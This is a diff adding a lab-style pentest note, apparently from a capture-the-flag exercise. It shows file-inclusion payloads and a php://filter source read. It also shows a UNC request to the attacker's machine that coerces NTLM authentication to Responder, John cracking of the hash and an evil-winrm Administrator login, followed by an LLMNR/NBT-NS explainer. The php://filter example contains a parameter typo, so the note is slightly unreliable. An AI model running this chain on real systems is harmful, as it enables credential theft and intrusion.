@@ -1,0 +1,64 @@
+---
+title: 'Remote File Include'
+desc: 'PHP upon Windows Services abusing NTLM'
+tags: 'windows,responder,tools'
+---
+
+
+# Remote File Include
+
+This access type abuse the Local File Include (LFI) vulnerability. Which allows to include paths in the URL like "http://target.com/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts".
+
+This is a wordlist to find common paths to resources. https://github.com/drtychai/wordlists/blob/master/intruder/lfi.txt
+
+It's possible to get a page in base64 looking for credentials abusing the url apllying filters, php filters in this case: index.php?page=php://filter/convert.base64-encode/resources=index.php
+
+See more in https://book.hacktricks.xyz/pentesting-web/file-inclusion
+
+1. responder: set the interface
+
+```
+# here is using the VPN to access the target
+responder -I tun0 
+```
+
+2. vulnerable URL: request for our machine
+
+```
+"http://target.com/index.php?page=//10.10.14.16/somefile"
+```
+
+3. Responder gives a Hash
+4. Save the Hash in file
+5. Break the Hash using John the Ripper + a wordlist
+
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+$> badminton
+```
+
+6. evil-rwin
+
+```
+evil-winrm -i 10.129.243.212 -u Administrator -p badminton 
+```
+
+## How NTLM is abussed
+
+If a Windows client cannot resolve a hostname using the DNS service, 
+it pushed the multicast name resolution protocol or better called “LLMNR” 
+to ask neighboring computers to resolve IPv4 and even under IPv6 addresses.
+
+If the request using LLMNR fails, the NetBios Name Service or NBT-NS protocol 
+was reasserted which accomplishes the same goal as above.
+
+So when a host uses LLMNR or NBT-NS to resolve a request for a network resource, 
+it is possible that any host on the network that knows the IP address 
+of the queried host can respond. Even if a host responds to one of these requests 
+with incorrect information, it will still be considered legitimate, 
+at that stage where the Responder.py tool is placed to capture credentials.
+
+
+
+
+
